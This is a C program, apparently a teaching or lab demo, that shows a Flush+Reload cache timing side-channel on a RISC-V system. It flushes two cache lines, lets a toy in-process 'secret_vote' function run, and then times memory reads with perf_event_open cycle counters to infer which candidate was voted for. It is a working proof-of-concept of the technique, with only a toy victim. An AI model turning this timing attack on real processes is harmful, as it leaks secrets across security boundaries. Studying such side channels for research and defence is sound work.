#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <time.h>
#include <assert.h>
#include "./rlibsc.h"
#include <sys/syscall.h>
#include <linux/perf_event.h>

#define PAGE_SIZE	0x1000
#define LINE_SIZE	64
#define LINE_A		2
#define LINE_B		15
char __attribute__((aligned(PAGE_SIZE))) my_buf[PAGE_SIZE] = {0};
#define votes_a		my_buf[LINE_A*LINE_SIZE+2]
#define votes_b		my_buf[LINE_B*LINE_SIZE+2]

void secret_vote(char candidate) {
    if (candidate == 'a')
    	votes_a++;
    else
	votes_b++;
}

static inline void
access_memory(void* pointer) {
    volatile uint32_t value;
    asm volatile ("lw %0, 0(%1)\n\t"
	: "=r" (value)
	: "r" (pointer)
	);
}

int main(int argc, char* argv[]) {
    int SAMPLES = 10;
    long long time_a = 0;
    long long time_b = 0;

    // Setup the perf_event_open timer
    static struct perf_event_attr attr;
    attr.type = PERF_TYPE_HARDWARE;
    attr.config = PERF_COUNT_HW_CPU_CYCLES;
    attr.size = sizeof(attr);
    attr.exclude_kernel = 1;
    attr.exclude_hv = 1;
    attr.exclude_callchain_kernel = 1;

    int perf_timer = syscall(__NR_perf_event_open, &attr, 0, -1, -1, 0);

    for (int i = 0; i < SAMPLES; i++) {
    	// 1. Flush
	flush(&votes_a);
	fence();

	flush(&votes_b);
	fence();

    	// 2. Victim executes
    	secret_vote('a');

    	// 3. Flush
	//size_t start = rdcycle();
	long long start = 0, end = 0;
	read(perf_timer, &start, sizeof(start));
	access_memory(&votes_a);
	//size_t end = rdcycle();
	read(perf_timer, &end, sizeof(end));
	time_a += end - start;

	//start = rdcycle();
	read(perf_timer, &start, sizeof(start));
	access_memory(&votes_b);
	read(perf_timer, &end, sizeof(end));
	//end = rdcycle();
	time_b += end - start;
    }

    printf("Time for votes_a: %lld; Time for votes_b: %lld\n", time_a, time_b);
    printf("Average time for votes_a: %llu; Average time for votes_b: %llu\n", time_a/SAMPLES, time_b/SAMPLES);

    if (time_a < time_b)
	printf("Victim vote a\n");
    else
	printf("Victim vote b\n");

    close(perf_timer);

    return 0;
}
